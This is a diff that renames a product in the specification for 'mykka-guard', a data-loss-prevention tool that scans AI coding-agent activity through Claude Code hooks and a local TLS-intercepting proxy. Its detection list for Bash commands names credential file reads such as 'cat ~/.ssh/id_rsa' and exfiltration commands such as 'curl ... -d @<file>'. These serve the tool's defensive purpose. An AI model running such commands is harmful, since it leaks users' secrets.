@@ -1,4 +1,4 @@
-# ciyo-guard — Product Specification
+# mykka-guard — Product Specification
 **Version:** 0.1 (pre-implementation)  
 **Date:** 2026-06-12  
 **Authors:** Marcus Webb (CTO), Yuki Tanaka, Ben Cho (PM)  
@@ -8,7 +8,7 @@
 
 ## 1. Problem
 
-ciyo.ai's Chrome extension enforces data loss prevention for browser-based AI tools (ChatGPT, Claude.ai, Gemini). It does not cover:
+mykka.ai's Chrome extension enforces data loss prevention for browser-based AI tools (ChatGPT, Claude.ai, Gemini). It does not cover:
 
 - **Claude Code** — a CLI agent that reads entire codebases, writes files, and runs shell commands. Sensitive data exits via direct API calls with no browser in the path.
 - **Cursor** — a VS Code fork whose AI features (autocomplete, chat, agent mode) make API calls through the Electron process, not the browser.
@@ -24,7 +24,7 @@ MCP-based enforcement was considered and **rejected**: MCP interception costs to
 
 ## 2. Solution Overview
 
-**ciyo-guard** — a single compiled binary, two enforcement modes, one admin interface.
+**mykka-guard** — a single compiled binary, two enforcement modes, one admin interface.
 
 | Mode | Mechanism | Covers | Token cost |
 |---|---|---|---|
@@ -47,20 +47,20 @@ Built with **Bun's native compile**: `bun build --compile`. Outputs a self-conta
 
 | Target | File |
 |---|---|
-| macOS ARM (Apple Silicon) | `ciyo-guard-macos-arm64` |
-| macOS x64 (Intel) | `ciyo-guard-macos-x64` |
-| Linux x64 | `ciyo-guard-linux-x64` |
-| Windows x64 | `ciyo-guard-windows-x64.exe` |
+| macOS ARM (Apple Silicon) | `mykka-guard-macos-arm64` |
+| macOS x64 (Intel) | `mykka-guard-macos-x64` |
+| Linux x64 | `mykka-guard-linux-x64` |
+| Windows x64 | `mykka-guard-windows-x64.exe` |
 
-Distributed via GitHub Releases. Self-update via `ciyo-guard update` (checks latest release, downloads, replaces self).
+Distributed via GitHub Releases. Self-update via `mykka-guard update` (checks latest release, downloads, replaces self).
 
 ### 3.2 Detection Engine
 
-Extracted from `pretzel/src/detection/` into a standalone package: **`@ciyo/detect`** (private npm package or workspace package).
+Extracted from `pretzel/src/detection/` into a standalone package: **`@mykka/detect`** (private npm package or workspace package).
 
 Package contents:
 ```
-packages/ciyo-detect/
+packages/mykka-detect/
   engine.ts         ← detectPrompt() — pure TS, no browser deps
   normalize.ts
   code-block.ts
@@ -76,26 +76,26 @@ packages/ciyo-detect/
 
 **Runtime requirements:** Node.js ≥ 18 or Bun ≥ 1.0 (both expose `crypto.subtle` and `performance.now()` natively).
 
-The Chrome extension, ciyo-guard binary, and any future enforcement clients all import `@ciyo/detect`. Single source of detection logic.
+The Chrome extension, mykka-guard binary, and any future enforcement clients all import `@mykka/detect`. Single source of detection logic.
 
 ### 3.3 Policy Sync
 
 Same pattern as the Chrome extension's `pretzel/src/policy/sync.ts`:
 
-1. On startup: `GET /v1/policy/version` → compare to cached version at `~/.ciyo/policy.version`
-2. If stale: `GET /v1/policy` → save `PolicyDoc` to `~/.ciyo/policy.json`
+1. On startup: `GET /v1/policy/version` → compare to cached version at `~/.mykka/policy.version`
+2. If stale: `GET /v1/policy` → save `PolicyDoc` to `~/.mykka/policy.json`
 3. If offline: serve cached policy. If no cache exists: fail open (warn only, no blocking) until connection is restored.
 
-**Policy cache location:** `~/.ciyo/` (user home directory)
+**Policy cache location:** `~/.mykka/` (user home directory)
 
 | File | Contents |
 |---|---|
-| `~/.ciyo/token` | Bearer token for API auth (600 permissions) |
-| `~/.ciyo/policy.json` | Cached `PolicyDoc` |
-| `~/.ciyo/policy.version` | Version integer of cached policy |
-| `~/.ciyo/queue.db` | SQLite queue for offline violation events |
-| `~/.ciyo/ca.key` | Self-signed CA private key (proxy mode only) |
-| `~/.ciyo/ca.crt` | Self-signed CA certificate (proxy mode only) |
+| `~/.mykka/token` | Bearer token for API auth (600 permissions) |
+| `~/.mykka/policy.json` | Cached `PolicyDoc` |
+| `~/.mykka/policy.version` | Version integer of cached policy |
+| `~/.mykka/queue.db` | SQLite queue for offline violation events |
+| `~/.mykka/ca.key` | Self-signed CA private key (proxy mode only) |
+| `~/.mykka/ca.crt` | Self-signed CA certificate (proxy mode only) |
 
 ### 3.4 Violation Reporting
 
@@ -105,7 +105,7 @@ Same pattern as the Chrome extension's `pretzel/src/policy/sync.ts`:
 Report flow:
 1. Violation detected → immediately return decision to hook/proxy
 2. Background: POST /v1/scans with { clientType: "claude-code-hook" | "local-proxy", ... }
-3. If POST fails (offline / server error): write to ~/.ciyo/queue.db
+3. If POST fails (offline / server error): write to ~/.mykka/queue.db
 4. On next startup / periodic timer: drain queue.db → retry POST
 ```
 
@@ -143,7 +143,7 @@ Hook decision format:
 
 ### 4.2 Installed Hook Configuration
 
-`ciyo-guard setup --claude-code` writes to `~/.claude/settings.json` (global) or `.claude/settings.json` (project, with `--scope=project`):
+`mykka-guard setup --claude-code` writes to `~/.claude/settings.json` (global) or `.claude/settings.json` (project, with `--scope=project`):
 
 ```json
 {
@@ -151,13 +151,13 @@ Hook decision format:
     "PreToolUse": [
       {
         "matcher": "Read|Write|Edit|MultiEdit|Bash|WebFetch",
-        "hooks": [{ "type": "command", "command": "ciyo-guard hook --event pre" }]
+        "hooks": [{ "type": "command", "command": "mykka-guard hook --event pre" }]
       }
     ],
     "PostToolUse": [
       {
         "matcher": "Read",
-        "hooks": [{ "type": "command", "command": "ciyo-guard hook --event post" }]
+        "hooks": [{ "type": "command", "command": "mykka-guard hook --event post" }]
       }
     ]
   }
@@ -166,7 +166,7 @@ Hook decision format:
 
 The `setup` command **merges** into existing `settings.json` — it does not overwrite it.
 
-### 4.3 What ciyo-guard Scans Per Tool
+### 4.3 What mykka-guard Scans Per Tool
 
 #### `Read` tool (PreToolUse + PostToolUse)
 
@@ -176,7 +176,7 @@ The `setup` command **merges** into existing `settings.json` — it does not ove
 {"tool": "Read", "input": {"file_path": "/path/to/file.ts"}}
 ```
 
-ciyo-guard:
+mykka-guard:
 1. Opens and reads the file at `file_path` itself
 2. Runs `detectPrompt(fileContents, policy, "file")` 
 3. If violation: returns `{"decision":"block","reason":"..."}` — Claude Code never reads the file
@@ -195,7 +195,7 @@ This ensures file content never enters model context if it contains sensitive da
 {"tool": "Edit", "input": {"file_path": "...", "old_string": "...", "new_string": "..."}}
 ```
 
-ciyo-guard scans `content` or `new_string` for sensitive data the model is about to write to disk. Use case: model accidentally generating output that includes credentials.
+mykka-guard scans `content` or `new_string` for sensitive data the model is about to write to disk. Use case: model accidentally generating output that includes credentials.
 
 #### `Bash` tool (PreToolUse)
 
@@ -203,7 +203,7 @@ ciyo-guard scans `content` or `new_string` for sensitive data the model is about
 {"tool": "Bash", "input": {"command": "curl -H 'Authorization: Bearer sk-ant-...' https://..."}}
 ```
 
-ciyo-guard scans the command string. Detection categories:
+mykka-guard scans the command string. Detection categories:
 - Credential tokens in flags (`-H "Authorization: Bearer <token>"`, `--password`, `--api-key`)
 - Credential file reads (`cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa`, `openssl rsa -in *.pem`)
 - Potential exfiltration commands (`curl https://external.com -d @<file>`, `wget --post-file`)
@@ -223,7 +223,7 @@ Scan URL for credential-shaped query parameters or fragments. Rare but catches c
 | Detection on 10KB text | < 5ms |
 | **Total per hook invocation** | **< 15ms** |
 
-Measurement: `ciyo-guard benchmark` command runs 100 iterations against a sample file, prints p50/p95/p99.
+Measurement: `mykka-guard benchmark` command runs 100 iterations against a sample file, prints p50/p95/p99.
 
 ### 4.5 Subject Resolution
 
@@ -237,7 +237,7 @@ Measurement: `ciyo-guard benchmark` command runs 100 iterations against a sample
 
 ### 5.1 How It Works
 
-`ciyo-guard daemon start` launches a local HTTPS proxy:
+`mykka-guard daemon start` launches a local HTTPS proxy:
 - Listens on `127.0.0.1:8877` (configurable via `--port`)
 - Intercepts HTTPS connections to configured AI API domains
 - Terminates TLS using a locally-generated CA certificate
@@ -249,7 +249,7 @@ Developer's tool (Cursor, script, Copilot)
          │
          │  HTTPS to api.anthropic.com
          ▼
-ciyo-guard daemon (127.0.0.1:8877)
+mykka-guard daemon (127.0.0.1:8877)
          │
          │  TLS termination (local CA cert)
          │  → extract messages[].content where role = "user"
@@ -270,7 +270,7 @@ The proxy performs TLS termination (MITM) which requires the client to trust the
 
 **Path A — Application-level (recommended, no sudo):**
 
-`ciyo-guard daemon setup --cursor` writes to `~/.cursor/settings.json`:
+`mykka-guard daemon setup --cursor` writes to `~/.cursor/settings.json`:
 ```json
 {
   "http.proxy": "http://127.0.0.1:8877",
@@ -278,23 +278,23 @@ The proxy performs TLS termination (MITM) which requires the client to trust the
 }
 ```
 
-Same for VS Code: `ciyo-guard daemon setup --vscode` writes to `~/.vscode/settings.json`.
+Same for VS Code: `mykka-guard daemon setup --vscode` writes to `~/.vscode/settings.json`.
 
 Coverage: Cursor and VS Code AI features. Does not cover command-line tools.
 
 **Path B — System-level (full coverage, requires one-time sudo/admin):**
 
-`ciyo-guard daemon setup --system`:
-1. Generates CA keypair → `~/.ciyo/ca.key` + `~/.ciyo/ca.crt`
+`mykka-guard daemon setup --system`:
+1. Generates CA keypair → `~/.mykka/ca.key` + `~/.mykka/ca.crt`
 2. Installs CA to OS trust store:
-   - macOS: `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.ciyo/ca.crt`
-   - Windows: `certutil -addstore Root ~/.ciyo/ca.crt`
+   - macOS: `security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.mykka/ca.crt`
+   - Windows: `certutil -addstore Root ~/.mykka/ca.crt`
    - Linux: copies to `/usr/local/share/ca-certificates/`, runs `update-ca-certificates`
 3. Appends to shell profile (`~/.zshrc`, `~/.bashrc`, `~/.profile`):
    ```bash
    export HTTPS_PROXY=http://127.0.0.1:8877
-   export SSL_CERT_FILE=~/.ciyo/ca.crt  # for Python/Go/Rust
-   export NODE_EXTRA_CA_CERTS=~/.ciyo/ca.crt  # for Node.js
+   export SSL_CERT_FILE=~/.mykka/ca.crt  # for Python/Go/Rust
+   export NODE_EXTRA_CA_CERTS=~/.mykka/ca.crt  # for Node.js
    ```
 
 Coverage: all HTTPS traffic from command-line AI tools, scripts, and IDEs.
@@ -303,7 +303,7 @@ Coverage: all HTTPS traffic from command-line AI tools, scripts, and IDEs.
 
 IT deploys via Intune/Jamf:
 1. Push CA cert to machine trust store
-2. Deploy `ciyo-guard` binary to `/usr/local/bin/` (macOS) or `C:\Program Files\ciyo\` (Windows)
+2. Deploy `mykka-guard` binary to `/usr/local/bin/` (macOS) or `C:\Program Files\mykka\` (Windows)
 3. Register as a Launch Agent (macOS) or Windows Service
 4. Set machine-level env vars or VS Code settings
 
@@ -349,11 +349,11 @@ HTTP 403 Forbidden
 Content-Type: application/json
 
 {
-  "error": "ciyo_policy_violation",
+  "error": "mykka_policy_violation",
   "message": "Request blocked: credential detected (rule: aws-secret-key)",
   "ruleId": "aws-secret-key",
   "severity": "critical",
-  "suggestion": "Remove the credential from your prompt. Check ciyo.ai/console for the full report."
+  "suggestion": "Remove the credential from your prompt. Check mykka.ai/console for the full report."
 }
 ```
 
@@ -362,10 +362,10 @@ Content-Type: application/json
 ## 6. CLI Interface
 
 ```
-ciyo-guard <command> [options]
+mykka-guard <command> [options]
 
 Commands:
-  login                      Authenticate with ciyo.ai (opens browser)
+  login                      Authenticate with mykka.ai (opens browser)
   logout                     Remove stored credentials
   install                    Auto-detect AI tools and configure protection
   setup --claude-code        Configure Claude Code hooks
@@ -383,10 +383,10 @@ Commands:
   logs [--tail N]            Show recent violation log
 ```
 
-### `ciyo-guard install` flow
+### `mykka-guard install` flow
 
 ```
-$ ciyo-guard install
+$ mykka-guard install
 
 Detecting AI tools...
   ✅ Claude Code found (~/.claude/settings.json)
@@ -401,12 +401,12 @@ Coverage summary:
   Claude Code    ✅ Protected (hooks mode, zero tokens)
   Cursor         ✅ Protected (proxy mode, application-level)
   System-wide    ○  Not configured
-                    → Run `ciyo-guard setup --system` for full OS coverage
+                    → Run `mykka-guard setup --system` for full OS coverage
                        (covers scripts, Jupyter, any future AI tool)
 
 Policy synced. 47 rules active. Last sync: just now.
 
-ciyo-guard is running. Your AI agent activity is protected.
+mykka-guard is running. Your AI agent activity is protected.
 ```
 
 ---
@@ -431,10 +431,10 @@ clientType: z.enum([
 // Request
 { name: string, scopes: ["policy:read", "scans:write"] }
 // Response  
-{ id: string, key: "ciyo_live_...", createdAt: string }
+{ id: string, key: "mykka_live_...", createdAt: string }
 ```
 
-Keys are scoped to a specific user (the key-holder's policy applies). The `GET /v1/policy` endpoint must accept `Authorization: Bearer ciyo_live_...` in addition to Clerk JWTs.
+Keys are scoped to a specific user (the key-holder's policy applies). The `GET /v1/policy` endpoint must accept `Authorization: Bearer mykka_live_...` in addition to Clerk JWTs.
 
 **`GET /v1/agent-coverage`** — per-member client status for Coverage Map:
 ```typescript
@@ -465,7 +465,7 @@ Populated from `clientType` and `userId` on recent scan records.
 - Table: member × client type, showing green/grey/red (active / inactive / never)
 - "Last active" timestamp per client per member
 - Export as CSV for audit evidence
-- "Send setup instructions" button → emails the member a link to `docs.ciyo.ai/install`
+- "Send setup instructions" button → emails the member a link to `docs.mykka.ai/install`
 
 **Reports → filter by Client Type** — dropdown on existing violation report views
 
@@ -478,20 +478,20 @@ Populated from `clientType` and `userId` on recent scan records.
 
 ---
 
-## 8. `@ciyo/detect` Package
+## 8. `@mykka/detect` Package
 
 ### 8.1 Purpose
 
 Extract `pretzel/src/detection/` and `pretzel/src/policy/schema.ts` into a standalone npm package. This:
 - Removes Vite path alias dependency (`@/` → relative imports)
-- Lets ciyo-guard import the detection engine without pulling in browser extension code
+- Lets mykka-guard import the detection engine without pulling in browser extension code
 - Enables future enforcement clients (git hooks, Jupyter extension) to import the same package
-- Enables third-party developers to integrate ciyo detection into their own AI applications
+- Enables third-party developers to integrate mykka detection into their own AI applications
 
 ### 8.2 Public API
 
 ```typescript
-import { detectPrompt, type PolicyDoc, type DetectionResult } from "@ciyo/detect";
+import { detectPrompt, type PolicyDoc, type DetectionResult } from "@mykka/detect";
 
 const result: DetectionResult = await detectPrompt(
   text,         // string — the text to scan
@@ -507,13 +507,13 @@ if (result.highestAction === "block") {
 
 ### 8.3 Extraction Checklist
 
-- [ ] Move `detection/` and relevant parts of `policy/schema.ts` to `packages/ciyo-detect/`
+- [ ] Move `detection/` and relevant parts of `policy/schema.ts` to `packages/mykka-detect/`
 - [ ] Replace `@/` aliases with relative imports
 - [ ] Replace `chrome.` references (none expected — engine.ts has none)
 - [ ] Verify `crypto.subtle` works in Bun test environment
 - [ ] Add standalone `vitest` config for the package
 - [ ] Port all existing unit tests from `pretzel/tests/unit/detection*` to the package
-- [ ] Update `pretzel/` to import from `@ciyo/detect` instead of local path
+- [ ] Update `pretzel/` to import from `@mykka/detect` instead of local path
 - [ ] Publish to private registry or configure as pnpm workspace package
 
 ---
@@ -532,8 +532,8 @@ if (result.highestAction === "block") {
 - `toolConfigs` in PolicyDoc for per-tool rule overrides (e.g., "stricter rules on Bash than Read")
 - Response scanning (catch AI echoing sensitive data back to client)
 - Agentic pipeline scanning (tracking multi-hop data flows across agent steps)
-- Browser extension + ciyo-guard unified violation correlation ("same credential leaked from Chrome AND Claude Code")
-- CLI key onboarding via MDM — silent install without `ciyo-guard login`
+- Browser extension + mykka-guard unified violation correlation ("same credential leaked from Chrome AND Claude Code")
+- CLI key onboarding via MDM — silent install without `mykka-guard login`
 
 ---
 
@@ -541,7 +541,7 @@ if (result.highestAction === "block") {
 
 | Phase | What | Audience |
 |---|---|---|
-| Alpha (weeks 1–3) | ciyo-guard hooks mode only. Install manually. No pretzel-console changes yet. | Internal team + 3 design partners |
+| Alpha (weeks 1–3) | mykka-guard hooks mode only. Install manually. No pretzel-console changes yet. | Internal team + 3 design partners |
 | Private Beta (weeks 4–6) | Hooks + proxy mode. API keys in pretzel-console. No Coverage Map yet. | 5 enterprise customers (Sofia's list) |
 | GA (week 8+) | Full feature set. Coverage Map in console. Published install docs. | All customers |
 
@@ -553,6 +553,6 @@ if (result.highestAction === "block") {
 |---|---|---|
 | Does PostToolUse block prevent content reaching model context? | Marcus | Verify vs Claude Code docs before Alpha |
 | Which Bun version to compile with for stable binary ABI? | Yuki | Week 1 |
-| API key format: use existing `ps_live_` prefix or new `ciyo_live_` prefix? | Marcus + Arjun | Before Alpha |
+| API key format: use existing `ps_live_` prefix or new `mykka_live_` prefix? | Marcus + Arjun | Before Alpha |
 | Windows TLS cert install: `certutil` requires admin — acceptable? | Ben | Week 2 (user research) |
 | Policy `destinations` field: remove from guard-facing PolicyDoc or just ignore? | Marcus | Before Private Beta |
